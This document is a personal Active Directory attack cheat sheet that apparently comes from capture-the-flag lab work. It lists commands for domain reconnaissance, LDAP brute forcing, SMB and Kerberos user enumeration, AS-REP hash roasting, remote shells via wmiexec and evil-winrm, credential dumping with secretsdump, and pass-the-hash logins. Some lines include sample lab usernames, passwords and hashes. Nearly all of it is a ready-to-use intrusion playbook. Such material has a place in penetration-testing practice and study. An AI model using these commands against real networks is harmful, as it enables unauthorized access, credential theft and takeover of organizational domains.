Active Directory used Tool HAcking;}}

Reconnaissance:

Nmap Scan:

nmap -v -sV -A -T4 <target_ip>

nmap --script smb-enum-domains.nse -p445 <host>

nmap -sU -sS --script smb-enum-domains.nse -p U:137,T:139 <host>

nmap -sT -Pn -n --open <target_ip> -p389 --script ldap-rootdse

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='example.com'"

nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <target_ip>

nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' <ldap.host>


#################################################################################################

Msfconsole:



FOr SMB:

auxiliary/scanner/smb/smb_version

auxiliary/scanner/smb/smb_login

auxiliary/scanner/smb/smb_login_domain

auxiliary/scanner/smb/smb_enum_domain_users

auxiliary/scanner/smb/smb_enum_users

auxiliary/scanner/smb/smb_enum_shares

auxiliary/scanner/smb/smb_enum_sessions


FOr Active Directory:

auxiliary/scanner/active_directory/active_directory_enum

auxiliary/admin/active_directory/active_directory_dcerpc_relay  => Priv Esc

auxiliary/admin/active_directory/active_directory_dfs

auxiliary/scanner/ldap/ldap_search

auxiliary/scanner/ldap/ldap_enum

auxiliary/admin/smb/dcomexec


#############################################################################################

Enum4linux:

enum4linux -a <target_ip or target_domain>  => general scanning


##############################################################################################

FOlder enumeration

smbclient -L <target_ip or target_domain>
  =>smbclient //<target_ip>/file -U <username>

smbmap -u anonymous<username> -H <target_ip>  => Access show 

rpcclient -U "" <target_ip>


################################################################################################


Users Detect and enumeration:

./kerbrute userenum --dc <target_ip> -d <target_domain> /home/kali/Documents/CTF/VulnNetRoastedWindowsCTF/userlist.txt

python3 /usr/share/doc/python3-impacket/examples/lookupsid.py <userdetectname>@<target_ip>  |""username try "anonymous"  => find user
	=>python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.117.62
	=>impacket-lookupsid vulnnet-rst.local/guest@10.10.111.177


python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip <target_ip> vulnnet-rst.local/ -no-pass -usersfile users.txt   => find user's hashes and Hash cracked
	=>python3 GetNPUsers.py -dc-ip 10.10.239.184 spookysec.local/svc-admin -no-pass


find user => smbclient -U vulnnet-rst.local/t-skid //10.10.100.15/NETLOGON 


#########################################################################################################


Connecting to the system remotely:(Remote Connect)


python3 wmiexec.py vulnnet-rst.local/a-whitehat@10.10.99.10
	=>impacket-wmiexec  vulnnet-rst.local/a-whitehat@10.10.111.177

OR


evil-winrm -i <target_ip> -u <username> -p "<password>"
	=>evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"


Capture all hashes (SAM)

python3 secretsdump.py domain/user:pass@10.10.100.15   
	=>python3 secretsdump.py vulnnet-rst.local/a-white:bNdKVk111111@10.10.100.15   
	=>impacket-secretsdump vulnnet-rst.local/a-whitehat@10.10.100.15
	=>python3 secretsdump.py -just-dc backup@spookysec.local -dc-ip 10.10.239.184


PASS THE HASH ATTACK:

evil-winrm -i <target_ip> -u username  -H "hash"
	=>evil-winrm -i 10.10.100.15 -u administrator -H "c2597747aa5e411111111111111"


impacket-wmiexec <domain>/username@<target_ip> -hashes <hash>
	=>python3 wmiexec.py test.local/john:password123@10.10.10.1
